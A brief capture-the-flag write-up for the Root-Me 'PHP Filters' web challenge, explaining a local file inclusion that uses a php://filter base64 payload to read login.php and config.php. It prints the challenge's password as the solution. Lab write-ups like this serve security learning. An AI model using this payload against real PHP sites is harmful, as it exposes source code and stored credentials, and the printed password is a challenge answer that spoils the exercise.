# [PHP Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-filters)

So we get a hint with the challenge title about "PHP Filters". Check out this little 
exploit [here](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

So if we send the url:

`?inc=php://filter/convert.base64-encode/resource=login.php`

We get the source code of `login.php` encoded in base64 which we can then decode.

It checks the username and pass provided against two variables declared in `config.php`

So let's look at `config.php` with:

`?inc=php://filter/convert.base64-encode/resource=config.php`

Boom!

Password is: **DAPt9D2mky0APAF**
